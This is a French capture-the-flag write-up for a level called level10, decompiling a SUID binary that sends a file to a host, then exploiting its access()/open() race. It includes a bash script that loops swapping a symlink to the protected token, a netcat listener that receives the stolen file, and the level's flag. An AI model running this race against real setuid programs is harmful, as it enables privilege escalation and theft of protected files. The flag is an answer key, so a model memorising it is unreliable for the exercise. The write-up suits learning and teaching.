## LEVEL10

- Comme pour les levels précédents, un binaire `level10` et un fichier `token` : 
```bash
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

- Bit SUID pour le binaire, qui sera exécuté avec les droits de flag10.
- Le fichier token appartient à flag10 et aucun droit dessus pour level10.



- On utilise ghidra :
```c

int main(int argc,char **argv)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined1 local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
                    /* Unresolved local var: char * file@[DW_OP_breg4(ESP): +40]
                       Unresolved local var: char * host@[DW_OP_breg4(ESP): +44] */
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = argv[1];
  __cp = argv[2];
  iVar2 = access(argv[1],4);
  if (iVar2 == 0) {
                    /* Unresolved local var: int fd@[DW_OP_breg4(ESP): +48]
                       Unresolved local var: int ffd@[DW_OP_breg4(ESP): +52]
                       Unresolved local var: int rc@[DW_OP_breg4(ESP): +56]
                       Unresolved local var: sockaddr_in sin@[DW_OP_breg4(ESP): +4156]
                       Unresolved local var: char[4096] buffer@[DW_OP_breg4(ESP): +60] */
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}
```

- Le programme prend 2 arguments, un fichier et une string devant représenter une adresse IP.
- Ensuite il verifie les droits sur le fichier avec `access()`, puis ouvre une socket et l'envoie sur l'adresse ip passée en 2ᵉ argument, port 6969.

## EXPLOITATION
- Comme le montre le man de access: 
```bash
Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so  using  open(2)
       creates  a security hole, because the user might exploit the short time interval between checking and opening the file to manipu‐
       late it.  For this reason, the use of this system call should be avoided.  (In the example just described,  a  safer  alternative
       would be to temporarily switch the process's effective user ID to the real ID and then call open(2).) 
```
- l’idée va etre de créer un dossier sur lequel on a les droits et un lien symbolique dessus qu’on va passer au programme afin de passer le contrôle d' `access()`, et de changer le lien symbolique pour qu'il pointe sur le vrai fichier token avant que le programme ne l'ouvre avec `open()`.

- On cree donc un script qui va créer le fichier fake et boucle de manière infinie pour changer le lien symbolique

- Ensuite il va boucler pour lancer le programme et ainsi obtenir une datarace.

```bash
#!/bin/bash

touch fake

while true; do
        /home/user/level10/level10 /tmp/link "127.0.0.1"
done &

while true; do
        ln -sf /tmp/fake /tmp/link
        ln -sf /home/user/level10/token /tmp/link
done
```

- Une fois cree on doit aussi ecouter sur le port 6969, pour ceci on peut utiliser `netcat` en filtrant les entrées vides.

```bash
while true;  do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
```

- On lance le script dans `/tmp` et au bout de quelques secondes on peut arreter les boucles et s’apercevoir qu’on a réussi a recuperer le token de flag10 :

## FLAG 

- feulo4b72j7edeahuete3no7c

